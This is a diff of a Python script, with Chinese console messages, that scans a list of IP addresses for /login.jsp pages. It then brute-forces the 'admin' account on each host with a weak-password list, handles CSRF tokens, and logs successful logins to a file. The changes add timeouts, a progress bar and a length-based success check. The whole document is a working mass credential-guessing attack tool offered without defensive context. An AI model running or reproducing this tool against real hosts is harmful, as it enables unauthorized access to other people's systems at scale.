@@ -5,6 +5,8 @@
 
 import requests
 import sys
+from progress.bar import Bar
+
 try:
     try:
         ip_file = sys.argv[1]
@@ -23,7 +25,7 @@ try:
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
         "Accept-Encoding": "gzip, deflate",
         "Accept-Language": "zh-CN,zh;q=0.9",
-        "Cookie": "JSESSIONID=154dys2dlf1jv5as92bd51mf",
+        "Cookie": "JSESSIONID=",
         "Connection": "close"
     }
     headers1 = {
@@ -36,7 +38,7 @@ try:
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
         "Accept-Encoding": "gzip, deflate",
         "Accept-Language": "zh-CN,zh;q=0.9",
-        "Cookie": "JSESSIONID=154dys2dlf1jv5as92bd51mf;csrf=O19BfQauke4xbq4",
+        "Cookie": "JSESSIONID=;csrf=O19BfQauke4xbq4",
         "Connection": "close"
     }
     data = {"url": "%2Findex.jsp", "login": "true", "username": "admin", "password": "123456"}
@@ -56,9 +58,21 @@ try:
             process = "当前进度--> {:.2%}".format(i / all_s)
             try:
                 url = "http://" + u.strip('\n') + "/login.jsp"
-                # print(url)
-                response = requests.get(url, verify=False, allow_redirects=True, timeout=3)
-                print(response.status_code, "%s -连接成功-->" % process, url)
+                # 测试连接是否正常
+                response = requests.get(url, verify=False, allow_redirects=True, timeout=2)
+                if response.status_code == 200:
+                    print(response.status_code, "%s -连接成功-->" % process, url)
+                else:
+                    print("001%s  -网页无效--> %s -------Error!!!" % (process, url))
+                # 测试登录是否异常
+                response_post_test = requests.post(url, verify=False, allow_redirects=True, data=data, headers=headers, timeout=2)
+                status_code_list = [200, 301, 302]
+                if (response_post_test.status_code not in status_code_list):
+                    print("004------登录异常--> %s -------Error!!!" % response_post_test.status_code)
+                    continue
+                else:
+                    # print(response_post_test.status_code)
+                    pass
                 ok_scan.append(url)
             except Exception as e:
                 if "Connection aborted" in str(e):
@@ -81,26 +95,39 @@ try:
             process1 = "当前进度--> {:.2%}".format(j / all_o)
             z = 0
             all_p = len(weakpass)
-            print("☆开始爆破-----%s %s--------------------☆" % (process1, b))
+            print("\n☆开始爆破-----%s %s--------------------☆\n" % (process1, b))
             # 测试是否含有CSRF认证
-            response_test = requests.post(b, verify=False, allow_redirects=True, data=data, headers=headers)
+            try:
+                response_test = requests.post(b, verify=False, allow_redirects=True, data=data, headers=headers, timeout=3)
+            except Exception as e:
+                print(e)
+                continue
             # 有CSRF需要替换data以及headers
             if "CSRF Failure" in response_test.text:
                 data = data1
                 headers = headers1
             else:
                 pass
+            bar = Bar(max=100, fill="█", suffix="%(percent)d%%", encoding="UTF-8")
             for wp in weakpass:
-                process2 = "爆破进度--> {:.2%} ".format(z / all_p)
+                process2 = "---progress--> {:.2%} ".format(z / all_p)
                 try:
                     data['password'] = wp
-                    response = requests.post(b, verify=False, allow_redirects=True, data=data, headers=headers)
+                    response = requests.post(b, verify=False, allow_redirects=True, data=data, headers=headers, timeout=3)
                     # print(response.text)
-                    if ("Login failed" in response.text) or ("登录失败" in response.text):
-                        print("%s 爆破失败---admin--%s" % (process2, wp))
+                    if ("Login failed" in response.text) or ("登录失败" in response.text) or ("BEGIN error box" in response.text):
+                        #print("%s %s 爆破失败---admin--%s" % (response.status_code, process2, wp))
+                        bar.next()
+                        pass
+                    # or ("Behaviour.register(myrules)" in response.text))
+                    elif(len(response.text) > 500):
+                        print("%s 爆破成功---admin--%s-----Successful!" % (process2, wp.strip('\n')))
+                        #print(response.status_code, response.headers['location'])
+                        f2.write("%s 爆破成功---admin--%s-----Successful!" % (b, wp.strip('\n')))
+                        bar.next(100)
+                        break
                     else:
-                        print("%s 爆破成功---admin--%s-----Successful!" % (process2, wp))
-                        f2.write("%s 爆破成功---admin--%s-----Successful!" % (b, wp))
+                        print(response.status_code)
                 except Exception as e:
                     if "Connection aborted" in str(e):
                         print("001%s  -网页无效--> %s -------Error!!!" % (process2, url))
@@ -108,7 +135,7 @@ try:
                     elif "NewConnectionError" in str(e):
                         print("002%s  -拒绝请求--> %s -------Error!!!" % (process2, url))
                         break
-                    elif "ConnectTimeoutError" in str(e):
+                    elif "HTTPConnectionPool" in str(e):
                         print("003%s  -连接超时--> %s -------Error!!!" % (process2, url))
                         break
                     else:
@@ -116,6 +143,7 @@ try:
                     pass
                 z = z + 1
             j = j + 1
+            bar.finish()
 except KeyboardInterrupt:
     print("已取消")
     sys.exit()
